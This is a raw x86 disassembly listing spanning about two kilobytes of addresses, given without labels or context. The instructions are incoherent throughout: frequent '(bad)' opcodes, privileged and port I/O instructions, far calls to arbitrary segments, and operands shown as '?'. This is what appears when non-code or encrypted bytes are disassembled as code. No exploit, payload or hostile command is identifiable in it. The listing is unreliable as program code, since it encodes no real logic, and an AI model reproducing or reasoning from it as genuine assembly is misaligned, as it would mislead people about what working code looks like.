  4235c5:	cmp    ecx,DWORD PTR [edi]
  4235c7:	into   
  4235c8:	shl    DWORD PTR ds:0xb7f5aafe,0x74
  4235cf:	push   cs
  4235d0:	and    BYTE PTR [esi],0x35
  4235d3:	stos   DWORD PTR es:[edi],eax
  4235d4:	dec    edi
  4235d5:	sbb    BYTE PTR [eax],bh
  4235d7:	and    edi,DWORD PTR [eax+0x16737bdc]
  4235dd:	sahf   
  4235de:	cmp    DWORD PTR [ebx],0x87157c51
  4235e4:	pop    ebp
  4235e5:	addr16 test dh,bh
  4235e8:	xchg   edi,eax
  4235e9:	sti    
  4235ea:	sti    
  4235eb:	popa   
  4235ec:	mov    BYTE PTR [edi],bh
  4235ee:	inc    ebp
  4235ef:	(bad)  
  4235f0:	push   edx
  4235f1:	fld    DWORD PTR [ebp+0x51e7f31f]
  4235f7:	ss retf 0xbb3a
  4235fb:	sbb    bl,dl
  4235fd:	mov    ds:0xff4f2399,eax
  423602:	scas   eax,DWORD PTR es:[edi]
  423603:	adc    ah,BYTE PTR [edi]
  423605:	int3   
  423606:	lahf   
  423607:	sbb    al,ch
  423609:	mov    eax,ds:0x5ec5e35c
  42360e:	push   ecx
  42360f:	xchg   esp,eax
  423610:	imul   edx,esp,0xffffff85
  423613:	pop    eax
  423614:	or     eax,0xce36f411
  423619:	out    dx,al
  42361a:	xchg   edx,eax
  42361b:	cmp    al,BYTE PTR [esi-0x38b7a257]
  423621:	icebp  
  423622:	xchg   bl,dh
  423624:	ins    DWORD PTR es:[edi],dx
  423625:	inc    ebp
  423626:	stos   BYTE PTR es:[edi],al
  423627:	sar    DWORD PTR [ebp-0x7a],1
  42362a:	or     dl,BYTE PTR [ebp-0x52]
  42362d:	or     BYTE PTR [eax-0x2c],0x3b
  423631:	add    ebx,DWORD PTR [ebp+0x5a]
  423634:	push   ebx
  423635:	xlat   BYTE PTR ds:[ebx]
  423636:	(bad)  
  423637:	jo     0x423647
  423639:	test   BYTE PTR [ebx+0x240f5325],ch
  42363f:	into   
  423640:	jae    0x4236bd
  423642:	inc    esi
  423643:	in     eax,0x5f
  423645:	icebp  
  423646:	icebp  
  423647:	sub    ch,BYTE PTR [eax]
  423649:	mov    edi,0x1761d4a5
  42364e:	mov    ebx,0xbc38318b
  423653:	adc    esp,ecx
  423655:	xchg   edx,eax
  423656:	pop    edi
  423657:	int    0x69
  423659:	gs in  al,0x5e
  42365c:	clc    
  42365d:	jbe    0x423665
  42365f:	push   ds
  423660:	push   esi
  423661:	jae    0x423645
  423663:	or     al,0xe6
  423665:	je     0x42360f
  423667:	add    BYTE PTR [edx+0x2a],al
  42366a:	push   ebp
  42366b:	fmul   QWORD PTR [eax+ebp*2+0x29]
  42366f:	mov    BYTE PTR [edx],ah
  423671:	iret   
  423672:	inc    ebp
  423673:	xor    bh,ah
  423675:	sbb    eax,DWORD PTR [edi+0x3c]
  423678:	(bad)  
  423679:	fmul   st,st(4)
  42367b:	sub    al,0x8c
  42367d:	aam    0xe7
  42367f:	fwait
  423680:	mov    ebp,0x97a7643a
  423685:	jecxz  0x423687
  423687:	xchg   esp,eax
  423688:	cdq    
  423689:	push   0xffffffa9
  42368b:	sub    dl,bl
  42368d:	add    al,0xb6
  42368f:	jnp    0x4236f2
  423691:	xchg   esi,eax
  423692:	mov    bl,0x89
  423694:	adc    bl,al
  423696:	(bad)  
  423697:	and    ah,ch
  423699:	in     eax,0x7
  42369b:	adc    dh,BYTE PTR [ecx-0x549e9fc3]
  4236a1:	enter  0x52d1,0xbd
  4236a5:	sub    esp,ebx
  4236a7:	(bad)  [esi+0x7]
  4236aa:	mov    DWORD PTR [ecx+esi*4],ecx
  4236ad:	mov    dl,0x1d
  4236af:	push   0xea0c3651
  4236b4:	lock add DWORD PTR [edi],ecx
  4236b7:	daa    
  4236b8:	inc    esi
  4236b9:	push   esi
  4236ba:	sub    BYTE PTR [esi],bl
  4236bc:	jbe    0x423701
  4236be:	push   edx
  4236bf:	ret    
  4236c0:	ror    DWORD PTR [edx+ebp*1-0x13c600d9],1
  4236c7:	rcr    DWORD PTR [eax],cl
  4236c9:	mov    al,0xdb
  4236cb:	cld    
  4236cc:	pop    eax
  4236cd:	ret    0x74b8
  4236d0:	or     DWORD PTR [ecx+0x60],0x47b98b1
  4236d7:	or     BYTE PTR [ebx+eax*1-0x7f959c48],ch
  4236de:	(bad)  
  4236df:	sbb    ebp,DWORD PTR [ebx+0x26d6bd6d]
  4236e5:	out    dx,al
  4236e6:	inc    ecx
  4236e7:	jbe    0x42372a
  4236e9:	and    eax,0xe1546936
  4236ee:	retf   0x4ba9
  4236f1:	xchg   ecx,eax
  4236f2:	es out dx,eax
  4236f4:	test   eax,0x2fc3075d
  4236f9:	in     al,0xca
  4236fb:	mov    ds:0x57e72ec5,al
  423700:	int3   
  423701:	jg     0x4236a2
  423703:	push   edx
  423704:	jle    0x4236d9
  423706:	and    al,0xfe
  423708:	sti    
  423709:	dec    ecx
  42370a:	(bad)  
  42370c:	dec    ebx
  42370d:	iret   
  42370e:	cmp    DWORD PTR [ebp+ecx*1-0x47],esp
  423712:	sti    
  423713:	cwde   
  423714:	retf   
  423715:	pop    esi
  423716:	pop    esi
  423717:	cmc    
  423718:	cld    
  423719:	dec    ebp
  42371a:	bound  edx,QWORD PTR [esp+eiz*8+0x2d]
  42371e:	cld    
  42371f:	xor    bl,BYTE PTR [edx+ebx*8+0x2d]
  423723:	(bad)  
  423725:	lahf   
  423726:	xor    ah,BYTE PTR [ebp-0x51]
  423729:	xchg   esi,eax
  42372a:	call   0x5dfa:0x61db25e0
  423731:	aaa    
  423732:	imul   edi,DWORD PTR [edi],0xebd29323
  423738:	popf   
  423739:	fwait
  42373a:	mov    BYTE PTR [edx-0x2],dl
  42373d:	mov    dl,0x23
  42373f:	mov    al,BYTE PTR ds:0x40961bd4
  423745:	or     ah,dh
  423747:	sbb    eax,0xd940dc20
  42374c:	icebp  
  42374d:	push   cs
  42374e:	jmp    0x7e20dacc
  423753:	mov    ch,0x4a
  423755:	adc    dh,BYTE PTR [ecx+0x47032e6d]
  42375b:	sbb    esp,ebp
  42375d:	xchg   DWORD PTR [eax+0x19],edi
  423760:	cld    
  423761:	(bad)  
  423762:	xchg   ebp,eax
  423763:	sub    eax,0x3145ff14
  423768:	scas   al,BYTE PTR es:[edi]
  423769:	and    esp,DWORD PTR ds:0x12a5a402
  42376f:	rol    ch,1
  423771:	enter  0x1f88,0xf9
  423775:	xchg   ebp,eax
  423776:	ins    BYTE PTR es:[edi],dx
  423777:	dec    edi
  423778:	aad    0x4e
  42377a:	stc    
  42377b:	xchg   esi,eax
  42377c:	js     0x423728
  42377e:	push   0x7f523134
  423783:	mov    edi,edx
  423785:	ds mov al,0xd9
  423788:	push   ebp
  423789:	push   eax
  42378a:	dec    edi
  42378b:	call   0x218c:0xc7965e8a
  423792:	pop    edi
  423793:	mov    edi,0xedae8c54
  423798:	xchg   DWORD PTR [ebp+0x19],ebp
  42379b:	shl    DWORD PTR [eax+0x456075c0],1
  4237a1:	js     0x4237c2
  4237a3:	js     0x423743
  4237a5:	sti    
  4237a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237a7:	stos   DWORD PTR es:[edi],eax
  4237a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237a9:	xchg   ebx,eax
  4237aa:	sbb    cl,BYTE PTR ds:0x19c2fade
  4237b0:	pop    ss
  4237b1:	scas   al,BYTE PTR es:[edi]
  4237b2:	sub    eax,0x6928ce6e
  4237b7:	jmp    0xba075914
  4237bc:	xlat   BYTE PTR ds:[ebx]
  4237bd:	pusha  
  4237be:	xchg   DWORD PTR [esp+esi*2],ecx
  4237c1:	push   0x63c706ed
  4237c6:	dec    ebp
  4237c7:	loopne 0x4237c6
  4237c9:	xor    DWORD PTR [ecx-0x65],ecx
  4237cc:	pop    edx
  4237cd:	jmp    0x423837
  4237cf:	xor    bl,BYTE PTR [ecx+0x5f]
  4237d2:	mov    bl,0xd7
  4237d4:	sbb    ch,ah
  4237d6:	lahf   
  4237d7:	xlat   BYTE PTR ds:[ebx]
  4237d8:	(bad)  
  4237d9:	in     al,dx
  4237da:	cmp    eax,0x48baac29
  4237df:	stc    
  4237e0:	xchg   esi,eax
  4237e1:	retf   0x8ae9
  4237e4:	(bad)  
  4237e5:	jmp    0x8b2967a5
  4237ea:	rol    DWORD PTR [esi],1
  4237ec:	pop    esp
  4237ed:	outs   dx,DWORD PTR ds:[esi]
  4237ee:	fist   DWORD PTR [edi]
  4237f0:	sub    DWORD PTR [esp+edi*1],0x6102de8c
  4237f7:	inc    edi
  4237f8:	mov    dl,BYTE PTR [ecx]
  4237fa:	pop    ecx
  4237fb:	icebp  
  4237fc:	rcr    DWORD PTR [esi],0xb8
  4237ff:	dec    ebx
  423800:	call   0x19d6:0xf33849e6
  423807:	jns    0x4237cd
  423809:	sbb    eax,DWORD PTR [edi+0x4d]
  42380c:	jns    0x42380d
  42380e:	mov    ebp,0x865c7737
  423813:	cmp    esi,edx
  423815:	outs   dx,BYTE PTR ds:[esi]
  423816:	lds    ebp,FWORD PTR [edx]
  423818:	mov    esp,DWORD PTR [edx]
  42381a:	shr    BYTE PTR [edx+ebp*2+0x46e5becb],1
  423821:	adc    ebp,DWORD PTR [edx]
  423823:	push   ebx
  423824:	stos   BYTE PTR es:[edi],al
  423825:	cs loop 0x42385c
  423828:	es add bh,dh
  42382b:	shl    BYTE PTR [ecx-0x2f],cl
  42382e:	and    al,0xc3
  423830:	or     bl,dl
  423832:	sti    
  423833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423834:	fwait
  423835:	pushf  
  423836:	adc    bh,BYTE PTR [ebp+0x3261471c]
  42383c:	mov    ebx,0x22f77105
  423841:	rol    DWORD PTR [ebx+0x11139a68],1
  423847:	inc    ebx
  423848:	or     BYTE PTR [ebx],cl
  42384a:	xlat   BYTE PTR ds:[ebx]
  42384b:	in     al,dx
  42384c:	inc    eax
  42384d:	cmp    BYTE PTR [edi-0x31],cl
  423850:	enter  0x5bf8,0xee
  423854:	push   eax
  423855:	aas    
  423856:	out    0x57,eax
  423858:	cmp    esi,DWORD PTR [eax-0x1c]
  42385b:	loopne 0x42383a
  42385d:	mov    dl,0x67
  42385f:	call   0xbd037a6e
  423864:	xchg   esi,eax
  423865:	or     BYTE PTR [esi],bh
  423867:	sub    cl,BYTE PTR [edi+0x2a5fc039]
  42386d:	pop    edx
  42386e:	sbb    al,0x5
  423870:	adc    ebp,DWORD PTR [esi]
  423872:	sub    eax,0x9bbc6c3e
  423877:	test   dl,ah
  423879:	sbb    ah,BYTE PTR [ecx+0x41]
  42387c:	bound  edi,QWORD PTR [edi*2+0x83abbd3]
  423883:	xchg   esp,eax
  423884:	dec    ecx
  423885:	pop    edi
  423886:	and    BYTE PTR [ebp+0x58c21711],bh
  42388c:	jne    0x423871
  42388e:	pop    edi
  42388f:	mov    esp,0xed49a7bd
  423894:	mov    esp,0x67d580f1
  423899:	fdivr  QWORD PTR [edx-0x7ad69f89]
  42389f:	pop    esp
  4238a0:	push   cs
  4238a1:	cmc    
  4238a2:	stos   DWORD PTR es:[edi],eax
  4238a3:	push   ecx
  4238a4:	dec    edi
  4238a5:	mov    ds:0x41c07cdc,eax
  4238aa:	add    BYTE PTR [esp+ebx*2-0x47],cl
  4238ae:	enter  0x3439,0x7b
  4238b2:	mov    edi,DWORD PTR [edi]
  4238b4:	xor    BYTE PTR [esi+0x7f],cl
  4238b7:	pop    esp
  4238b8:	cmp    edx,0x46
  4238bb:	repz popa 
  4238bd:	mov    bl,BYTE PTR ds:0x2e611278
  4238c3:	call   0x767b:0x1e9b67f3
  4238ca:	repnz xchg ecx,eax
  4238cc:	outs   dx,DWORD PTR ds:[esi]
  4238cd:	jg     0x4238ca
  4238cf:	inc    ebp
  4238d0:	jae    0x423862
  4238d2:	stos   BYTE PTR es:[edi],al
  4238d3:	push   esi
  4238d4:	cmp    DWORD PTR ss:[ecx+edx*4+0x65],ecx
  4238d9:	xchg   esi,eax
  4238da:	cli    
  4238db:	xchg   ebp,eax
  4238dc:	xor    eax,0x8807d65f
  4238e1:	shr    al,1
  4238e3:	dec    eax
  4238e4:	mov    bl,0x88
  4238e6:	sub    eax,DWORD PTR [esi]
  4238e8:	inc    ebp
  4238e9:	jle    0x42386b
  4238eb:	xchg   edi,eax
  4238ec:	pop    esp
  4238ed:	adc    DWORD PTR ds:0x5ccd4a4f,0xffffffb2
  4238f4:	jge    0x423932
  4238f6:	xor    DWORD PTR es:[esi],0x40197a65
  4238fd:	test   al,0x7c
  4238ff:	push   edx
  423900:	fisttp WORD PTR [edi-0x54]
  423903:	arpl   si,cx
  423905:	cmp    ecx,DWORD PTR [ebp+0x790f2f28]
  42390b:	push   ss
  42390c:	push   edi
  42390d:	sbb    al,0x5b
  42390f:	cmc    
  423910:	(bad)  
  423911:	sub    al,0x4d
  423913:	adc    al,0xbd
  423915:	mov    bl,0x6e
  423917:	push   esp
  423918:	loope  0x4238af
  42391a:	dec    ecx
  42391b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391c:	pop    ebp
  42391d:	fsubr  QWORD PTR [edx-0x2662b060]
  423923:	out    dx,eax
  423924:	mov    dl,0xb5
  423926:	call   0x58dde4cf
  42392b:	pusha  
  42392c:	fstp   QWORD PTR [edi]
  42392e:	and    al,BYTE PTR [ecx*1+0xfbb7112]
  423935:	mov    eax,0x6eeae749
  42393a:	xlat   BYTE PTR ds:[ebx]
  42393b:	imul   esp,DWORD PTR [ebp+0x73ba83fc],0x2
  423942:	ret    0xbbc9
  423945:	sub    BYTE PTR ds:0x88c12d24,cl
  42394b:	mov    dh,dl
  42394d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42394e:	mov    cl,0x55
  423950:	ss jae 0x42390a
  423953:	dec    edi
  423954:	push   ss
  423955:	fcomp  DWORD PTR [ebp+0x22]
  423958:	aas    
  423959:	int    0x5a
  42395b:	inc    edx
  42395c:	in     eax,dx
  42395d:	imul   edi,DWORD PTR [ebp-0x60c347a6],0x52
  423964:	(bad)  
  423965:	adc    DWORD PTR [edx+0x78c022fa],eax
  42396b:	xor    al,0x64
  42396d:	jl     0x423924
  42396f:	sbb    ah,BYTE PTR [ebp+0x44]
  423972:	mov    ah,0x57
  423974:	xchg   esi,eax
  423975:	sbb    DWORD PTR [ebx+0x2c],esi
  423978:	push   ebx
  423979:	mov    esi,0x97c10815
  42397e:	shr    ch,cl
  423980:	neg    DWORD PTR [eax+0x6b7dfb74]
  423986:	gs pop ebx
  423988:	ins    BYTE PTR es:[edi],dx
  423989:	pop    ebx
  42398a:	fimul  WORD PTR [ebx+eiz*2-0x2f22f065]
  423991:	jne    0x423925
  423993:	mov    ecx,0x95245f64
  423998:	inc    edx
  423999:	jno    0x423973
  42399b:	or     al,0xb5
  42399d:	loope  0x42399b
  42399f:	mov    dh,0x3e
  4239a1:	jp     0x4239d4
  4239a3:	lahf   
  4239a4:	mov    dl,al
  4239a6:	cmp    eax,0xcd566631
  4239ab:	pushf  
  4239ac:	mov    ebp,0x40a9c497
  4239b1:	and    BYTE PTR [edx+0xc],0xee
  4239b5:	dec    ebp
  4239b6:	inc    eax
  4239b7:	sbb    BYTE PTR [edi-0x76],bl
  4239ba:	fidiv  DWORD PTR [edi-0x380de824]
  4239c0:	and    BYTE PTR [esi+0x70b0b6e6],ah
  4239c6:	test   DWORD PTR [ebx+ecx*4+0x1b8c6a66],edi
  4239cd:	lds    ebp,FWORD PTR [edi+esi*2+0x1e53a3c7]
  4239d4:	aam    0xb7
  4239d6:	jmp    0x7cab2a57
  4239db:	sbb    eax,0x65794184
  4239e0:	push   edi
  4239e1:	loop   0x4239ce
  4239e3:	fucom  st(5)
  4239e5:	xor    BYTE PTR [edi-0x56],0x61
  4239e9:	push   esp
  4239ea:	mov    edi,0x62f72fab
  4239ef:	add    eax,0x89308ede
  4239f4:	and    eax,0x8f89574b
  4239f9:	loop   0x4239ff
  4239fb:	scas   al,BYTE PTR es:[edi]
  4239fc:	xor    ah,BYTE PTR [edi]
  4239fe:	and    eax,0xee5974ae
  423a03:	add    BYTE PTR [esi-0x203aa547],dl
  423a09:	leave  
  423a0a:	jo     0x423a7e
  423a0c:	outs   dx,BYTE PTR ds:[esi]
  423a0d:	and    dl,BYTE PTR [eax*2-0x654441d7]
  423a14:	cmp    bh,BYTE PTR [edi-0x1e1dc3c0]
  423a1a:	ror    BYTE PTR [esi+ecx*2+0x7b538147],0x5e
  423a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a23:	cmp    al,0xa6
  423a25:	popf   
  423a26:	shl    DWORD PTR [ebp+0x6f],1
  423a29:	je     0x423a56
  423a2b:	jb     0x423a80
  423a2d:	jae    0x423a05
  423a2f:	pop    eax
  423a30:	xor    DWORD PTR [ecx+0x51f5f830],esp
  423a36:	jg     0x423a2c
  423a38:	xchg   BYTE PTR [ebx-0x7ebf84f4],cl
  423a3e:	jmp    0xd402e48
  423a43:	test   al,0x82
  423a45:	sub    ebx,DWORD PTR [eax-0x335f0f08]
  423a4b:	mov    ebp,0x6629f92c
  423a50:	(bad)  
  423a51:	addr16 out dx,al
  423a53:	lahf   
  423a54:	adc    ebp,DWORD PTR [eax-0x497bf0aa]
  423a5a:	cdq    
  423a5b:	test   al,0x17
  423a5d:	sub    cl,BYTE PTR [esi-0x13]
  423a60:	and    edx,ecx
  423a62:	or     bh,dh
  423a64:	xchg   ebx,eax
  423a65:	shr    BYTE PTR [eax-0x2d641a6b],1
  423a6b:	cdq    
  423a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a6d:	mov    ebx,0xce131b65
  423a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a73:	es stos BYTE PTR es:[edi],al
  423a75:	jb     0x423aa7
  423a77:	inc    edx
  423a78:	cmc    
  423a79:	jle    0x423ae4
  423a7b:	out    0x37,eax
  423a7d:	add    al,0x51
  423a7f:	push   ecx
  423a80:	rcl    DWORD PTR [edi-0x12],1
  423a83:	mov    eax,?
  423a85:	mov    ah,0xbf
  423a87:	dec    ecx
  423a88:	fstp   DWORD PTR [ecx-0x54a418fb]
  423a8e:	mov    esp,0x2c013e62
  423a93:	int    0xd7
  423a95:	dec    edi
  423a96:	mov    cl,0xaf
  423a98:	mov    ecx,0xdeab59be
  423a9d:	in     al,dx
  423a9e:	out    dx,eax
  423a9f:	lods   al,BYTE PTR ds:[esi]
  423aa0:	js     0x423abb
  423aa2:	cmp    ebp,ebp
  423aa4:	fisub  WORD PTR [ebx+0x39]
  423aa7:	ja     0x423a71
  423aa9:	and    eax,0x89be7090
  423aae:	sbb    ah,al
  423ab0:	rol    DWORD PTR [edi-0x2e],0x59
  423ab4:	mov    dh,0x7d
  423ab6:	popf   
  423ab7:	jno    0x423a86
  423ab9:	dec    esi
  423aba:	stc    
  423abb:	ins    BYTE PTR es:[edi],dx
  423abc:	fwait
  423abd:	mov    eax,0x9c2637b2
  423ac2:	pop    eax
  423ac3:	jno    0x423ae1
  423ac5:	bound  ecx,QWORD PTR [eax+0x30929d48]
  423acb:	cmp    DWORD PTR [edx],0x5f
  423ace:	outs   dx,DWORD PTR ds:[esi]
  423acf:	adc    bl,BYTE PTR ds:0x4aa703d4
  423ad5:	ins    BYTE PTR es:[edi],dx
  423ad6:	in     eax,dx
  423ad7:	pop    ecx
  423ad8:	aam    0xc0
  423ada:	mov    dl,0xc2
  423adc:	or     al,0xa9
  423ade:	fidivr DWORD PTR [ebp+0x14543d90]
  423ae4:	jg     0x423abf
  423ae6:	or     al,0xef
  423ae8:	lea    esp,[ebx+0x6]
  423aeb:	shl    BYTE PTR [edi+0x27],0xf9
  423aef:	retf   0x21e8
  423af2:	in     al,0x71
  423af4:	push   ebp
  423af5:	and    BYTE PTR [ebp-0xf8e054b],dh
  423afb:	fidivr DWORD PTR [ecx+0x77ea88fd]
  423b01:	repz mov esi,DWORD PTR [esi+edx*2+0x2d]
  423b06:	loopne 0x423b5f
  423b08:	dec    ecx
  423b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b0b:	xchg   ebx,eax
  423b0c:	rol    DWORD PTR [edi-0x15bb531d],0xc4
  423b13:	iret   
  423b14:	pop    ebx
  423b15:	ins    BYTE PTR es:[edi],dx
  423b16:	ds inc eax
  423b18:	sub    al,0x37
  423b1a:	mov    ebx,edi
  423b1c:	fadd   QWORD PTR [edi-0x51]
  423b1f:	push   ebx
  423b20:	(bad)  
  423b21:	enter  0xcdcf,0x3e
  423b25:	loopne 0x423b51
  423b27:	(bad)  
  423b28:	xor    BYTE PTR [edx],al
  423b2a:	imul   BYTE PTR [edi]
  423b2c:	outs   dx,BYTE PTR ds:[esi]
  423b2d:	xchg   edx,eax
  423b2e:	push   eax
  423b2f:	dec    esp
  423b30:	stc    
  423b31:	mov    ds,WORD PTR [esi-0x46]
  423b34:	sub    eax,ebp
  423b36:	test   eax,0x5c79595a
  423b3b:	mov    edx,0x3db97812
  423b40:	cmp    DWORD PTR [esp+edi*4+0x10909e1d],edi
  423b47:	sub    BYTE PTR [esi-0x4c],dh
  423b4a:	mov    bh,0x26
  423b4c:	adc    DWORD PTR [ecx*2+0x11a098b2],edi
  423b53:	rcr    BYTE PTR [eax-0x1acaf63e],cl
  423b59:	je     0x423b18
  423b5b:	push   edi
  423b5c:	or     BYTE PTR [ecx],0xcd
  423b5f:	xor    al,0xe8
  423b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b62:	ret    
  423b63:	fisttp QWORD PTR [ebp-0x55f56e7c]
  423b69:	push   edx
  423b6a:	mov    esp,0x9ffe2b7a
  423b6f:	jno    0x423b6a
  423b71:	or     ebx,eax
  423b73:	dec    esi
  423b74:	shl    BYTE PTR [edi+eax*1+0x4a],1
  423b78:	test   DWORD PTR ds:0xec89db0e,ecx
  423b7e:	fcomp  DWORD PTR [eax-0x4026a2ed]
  423b84:	or     ch,BYTE PTR [ebp+eax*1-0x7ef1f550]
  423b8b:	xor    BYTE PTR [ebx+ebp*2+0x9],ch
  423b8f:	rcr    DWORD PTR [esi],cl
  423b91:	std    
  423b92:	adc    BYTE PTR [ebx+0x70],0x6a
  423b96:	cwde   
  423b97:	repz adc edi,DWORD PTR [ebp+0x7e]
  423b9b:	mov    bl,0x3a
  423b9d:	sbb    al,0xb4
  423b9f:	pop    ebp
  423ba0:	mov    ebp,?
  423ba2:	std    
  423ba3:	xor    al,0xf5
  423ba5:	adc    BYTE PTR [eax+0x79a0461],bh
  423bab:	xchg   edi,eax
  423bac:	in     al,0x38
  423bae:	push   edx
  423baf:	xor    cl,BYTE PTR [edx+0x6e]
  423bb2:	pop    eax
  423bb3:	inc    esi
  423bb4:	cs dec ebp
  423bb6:	les    esp,FWORD PTR [edi]
  423bb8:	cmp    al,0xf8
  423bba:	arpl   WORD PTR [edx+0x6c],si
  423bbd:	dec    edx
  423bbe:	and    al,BYTE PTR [eax-0x65658b0a]
  423bc4:	lea    edi,[edx-0x5b42f63c]
  423bca:	pop    ecx
  423bcb:	push   eax
  423bcc:	in     eax,dx
  423bcd:	lea    eax,[esi-0x38]
  423bd0:	icebp  
  423bd1:	xor    DWORD PTR [edi+0x7f],0xe8738418
  423bd8:	push   ecx
  423bd9:	adc    eax,0xb8037163
  423bde:	or     eax,0x2a6292f7
  423be3:	std    
  423be4:	mov    DWORD PTR [ebx],ebx
  423be6:	push   ebx
  423be7:	mov    DWORD PTR [edi-0x824c0b8],esp
  423bed:	js     0x423bcb
  423bef:	test   al,0xc4
  423bf1:	fild   DWORD PTR [esp+eax*1-0x364f2bb1]
  423bf8:	das    
  423bf9:	jno    0x423c3d
  423bfb:	sub    BYTE PTR [ecx+0xd],0xf1
  423bff:	or     DWORD PTR [eax-0x50ba02c3],edi
  423c05:	or     dl,cl
  423c07:	test   DWORD PTR [edi+0x5d6a71d8],0xfc88393f
  423c11:	add    BYTE PTR [edx],dl
  423c13:	inc    eax
  423c14:	add    eax,0xfe939452
  423c19:	xchg   esi,eax
  423c1a:	mov    bh,BYTE PTR [eax]
  423c1c:	adc    BYTE PTR [edi-0x3c67003a],ah
  423c22:	push   edx
  423c23:	jne    0x423c9f
  423c25:	push   es
  423c26:	inc    ecx
  423c27:	inc    edi
  423c28:	or     esp,DWORD PTR [esi+0x68efb997]
  423c2e:	dec    BYTE PTR [edi+edi*1]
  423c31:	cmp    eax,0xd01216b
  423c36:	pop    esi
  423c37:	mov    ebx,0x3bcdcb11
  423c3c:	mov    BYTE PTR [esi+eax*4+0x5f05ab58],bl
  423c43:	xchg   edx,eax
  423c44:	js     0x423c67
  423c46:	cmp    eax,DWORD PTR [esi]
  423c48:	clc    
  423c49:	sub    DWORD PTR [ecx-0x15],edx
  423c4c:	xor    esp,DWORD PTR [edi-0x79]
  423c4f:	lods   eax,DWORD PTR ds:[esi]
  423c50:	xor    al,0xd5
  423c52:	push   es
  423c53:	dec    ecx
  423c54:	cdq    
  423c55:	outs   dx,BYTE PTR ds:[esi]
  423c56:	inc    ebp
  423c57:	aam    0x4e
  423c59:	mov    eax,0x77b2384c
  423c5e:	and    cl,BYTE PTR [ecx]
  423c60:	push   ebp
  423c61:	xchg   esp,eax
  423c62:	retf   
  423c63:	out    0x28,al
  423c65:	push   edx
  423c66:	dec    esp
  423c67:	sbb    ch,bl
  423c69:	xor    eax,0x2e5773e0
  423c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c6f:	add    eax,0x12600a39
  423c74:	data16 mov dh,BYTE PTR [ecx-0x54a7e287]
  423c7b:	sub    al,BYTE PTR [edi]
  423c7d:	mov    esi,0x6d6965bd
  423c82:	ja     0x423cf2
  423c84:	dec    ebp
  423c85:	sti    
  423c86:	fstp   DWORD PTR [esp+ecx*1-0x69]
  423c8a:	add    ebx,DWORD PTR [esi+0x61caa2ae]
  423c90:	mov    WORD PTR [esi+eiz*4-0x2cde8e7b],ds
  423c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c98:	and    BYTE PTR [ebp+0x2b],cl
  423c9b:	repnz loope 0x423c80
  423c9e:	fcomp  QWORD PTR [edi]
  423ca0:	jp     0x423d0c
  423ca2:	sub    DWORD PTR [edi+0x4b],0x4837847d
  423ca9:	cmp    DWORD PTR [eax],0x5a
  423cac:	xchg   esi,eax
  423cad:	pusha  
  423cae:	scas   al,BYTE PTR es:[edi]
  423caf:	stos   BYTE PTR es:[edi],al
  423cb0:	sahf   
  423cb1:	ret    0xf848
  423cb4:	mov    al,0xcd
  423cb6:	iret   
  423cb7:	jl     0x423c4a
  423cb9:	dec    ebp
  423cba:	imul   ebp,DWORD PTR [edi],0xffffff95
  423cbd:	gs dec esp
  423cbf:	aad    0x98
  423cc1:	into   
  423cc2:	imul   esp,DWORD PTR [ebx-0x2b443f92],0x74c2e51b
  423ccc:	push   ebx
  423ccd:	das    
  423cce:	pop    edi
  423ccf:	and    DWORD PTR ds:0x3df0e02d,0xffffffcf
  423cd6:	sub    dl,BYTE PTR [bx+si+0x18]
  423cda:	adc    BYTE PTR [edi+0x5],ah
  423cdd:	mov    ds:0x44602e81,eax
  423ce2:	(bad)  [esi+ebp*4]
  423ce5:	mov    ds:0xb25cd4cc,eax
  423cea:	ret    0x2029
  423ced:	xor    ebx,edi
  423cef:	sar    BYTE PTR [eax+edi*2-0x74],cl
  423cf3:	cmp    edx,DWORD PTR [eax]
  423cf5:	out    dx,al
  423cf6:	daa    
  423cf7:	mov    ebx,0x2afd3d57
  423cfc:	test   BYTE PTR [edx+ebp*2+0x44],0x33
  423d01:	or     ebx,DWORD PTR [eax+0x10]
  423d04:	shl    DWORD PTR [edi+0x7d],cl
  423d07:	mov    BYTE PTR [eax],bh
  423d09:	add    cl,BYTE PTR [edx]
  423d0b:	repz pop esi
  423d0d:	lea    edi,[esi]
  423d0f:	fld    st(7)
  423d11:	add    eax,0x20eeceaa
  423d16:	popa   
  423d17:	push   esp
  423d18:	push   ebp
  423d19:	xor    eax,0x39
  423d1c:	mov    ch,0x54
  423d1e:	loope  0x423d72
  423d20:	push   ds
  423d21:	add    al,0x4f
  423d23:	add    eax,DWORD PTR [edx-0x20]
  423d26:	sbb    DWORD PTR [edi],ebx
  423d28:	cs aam 0x43
  423d2b:	fist   WORD PTR [eax-0x64a0f680]
  423d31:	sbb    bh,BYTE PTR [edi-0x15b0193e]
  423d37:	push   eax
  423d38:	fcomi  st,st(3)
  423d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d3b:	neg    ah
  423d3d:	fadd   DWORD PTR [esi+0x6]
  423d40:	test   DWORD PTR [edi+0xef6157e],esp
  423d46:	cmp    al,0xb
  423d48:	bound  esi,QWORD PTR ds:0xb819f418
  423d4e:	bswap  ebx
  423d50:	clc    
  423d51:	dec    ebx
  423d52:	frstor [esi+edx*8+0xb]
  423d56:	scas   eax,DWORD PTR es:[edi]
  423d57:	imul   eax,ecx,0x56e9f634
  423d5d:	or     eax,0xc5ced562
  423d62:	mov    esi,DWORD PTR [esi+0x26]
  423d65:	bound  eax,QWORD PTR [esi+0x2bd7f5ea]
  423d6b:	pop    ebp
  423d6c:	adc    eax,ecx
  423d6e:	sti    
  423d6f:	loope  0x423d46
  423d71:	xor    DWORD PTR [ebp+0x6b9f61a5],eax
  423d77:	sub    eax,0xfabf57dc
  423d7c:	dec    esp
  423d7d:	and    dh,BYTE PTR [eax+ecx*4]
  423d80:	mov    BYTE PTR [esi+ebx*4+0x3d23e5e3],ch
